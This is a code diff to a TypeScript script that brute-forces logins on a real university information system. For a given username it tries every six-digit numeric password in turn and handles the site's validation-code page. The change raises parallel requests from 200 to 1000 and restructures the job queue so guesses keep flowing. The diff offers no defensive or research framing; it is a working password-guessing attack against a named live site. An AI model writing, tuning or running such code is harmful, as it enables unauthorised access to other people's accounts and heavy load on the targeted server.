@@ -2,7 +2,7 @@ import FormData = require("form-data");
 import fetch, { FetchError } from "node-fetch"
 import cheerio = require("cheerio")
 import Utils from "./utils"
-import async from 'async';
+import async, { queue } from 'async';
 const log = console.log
 const baseUrl = "http://mis.sse.ustc.edu.cn/"
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
@@ -13,7 +13,7 @@ export function worker(username: string): Promise<any>{
     let success = false
     let view_state = ""
     let password = "000000"
-    const concurrency = 200
+    const concurrency = 1000
     username = username.toLowerCase()
     log("username: ",username)
         /**
@@ -84,13 +84,24 @@ export function worker(username: string): Promise<any>{
           })
         },concurrency)
         
-        while(parseInt(password)<=999999&&!success){
+        const push = ()=>{
           trypass.push(password,()=>{
+            log("length",trypass.length())
+            log("running",trypass.running())
+            if(trypass.length()<100){
+              push()
+            }
             if(success){
               trypass.kill()
             }
+            if(trypass.empty()){
+              resolve()
+            }
           })
           password = increase(password)
+        }
+        while(parseInt(password)<=200&&!success){
+          push()
         }
       } catch (error) {
         log(error)
